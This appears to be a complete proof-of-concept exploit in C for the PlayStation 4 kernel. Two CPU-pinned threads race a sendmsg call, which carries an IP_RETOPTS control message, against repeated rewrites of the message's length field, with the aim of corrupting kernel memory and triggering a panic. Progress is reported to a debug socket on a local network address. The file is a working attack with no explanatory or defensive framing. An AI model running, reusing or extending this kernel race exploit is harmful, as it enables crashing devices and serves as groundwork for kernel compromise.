#include "ps4.h"

typedef struct {
    uint64_t bits[16];
} cpuset_t;

#define _CPU_SET(cpu, cpusetp) ((cpusetp)->bits[(cpu) / 64] |= (1ULL << ((cpu) % 64)))
#define _CPU_ZERO(cpusetp) memset((cpusetp), 0, sizeof(cpuset_t))

struct msghdr {
    void         *msg_name;
    uint32_t      msg_namelen;
    void         *msg_iov;
    int           msg_iovlen;
    void         *msg_control;
    uint32_t      msg_controllen;
    int           msg_flags;
};

struct cmsghdr {
    uint32_t      cmsg_len;
    int           cmsg_level;
    int           cmsg_type;
};

#define IP_RETOPTS 7
#define ITERATIONS 500000
#define CONTROL_LEN 256
#define DEBUG_IP "192.168.100.16"
#define DEBUG_PORT 9023

struct cmsghdr *cmsg;
uint8_t control_buf[CONTROL_LEN];
int global_sock;
int debug_sock;

void debug_print(const char *msg) {
    if (debug_sock > 0) {
        SckSend(debug_sock, (char *)msg, strlen(msg));
    }
}

void *sendmsg_thread(void *arg) {
    UNUSED(arg);
    cpuset_t cpuset;
    _CPU_ZERO(&cpuset);
    _CPU_SET(0, &cpuset);
    syscall(597, scePthreadSelf(), sizeof(cpuset), &cpuset);

    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;

    for (int i = 0; i < ITERATIONS; i++) {
        syscall(28, global_sock, &msg, 0);
    }
    return NULL;
}

void *race_thread(void *arg) {
    UNUSED(arg);
    cpuset_t cpuset;
    _CPU_ZERO(&cpuset);
    _CPU_SET(1, &cpuset);
    syscall(597, scePthreadSelf(), sizeof(cpuset), &cpuset);

    if (!cmsg) return NULL;

    for (int i = 0; i < ITERATIONS; i++) {
        cmsg->cmsg_len = 0x50;
        cmsg->cmsg_len = 0xFFFF;
    }
    return NULL;
}

int _main(struct thread *td) {
    UNUSED(td);
    initKernel();
    initLibc();
    initNetwork();
    initPthread();

    debug_sock = SckConnect(DEBUG_IP, DEBUG_PORT);
    debug_print("[+] Connected! Starting POC\n");

    global_sock = syscall(97, 2, 2, 0);
    if (global_sock < 0) {
        debug_print("[-] Socket failed\n");
        return -1;
    }

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0;
    cmsg->cmsg_type = IP_RETOPTS;
    cmsg->cmsg_len = 0x50;

    debug_print("[+] Starting threads...\n");

    ScePthread thread1, thread2;
    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(thread1, NULL);
    scePthreadJoin(thread2, NULL);

    debug_print("[+] Done. Check for Panic.\n");

    if (debug_sock > 0) SckClose(debug_sock);
    return 0;
}
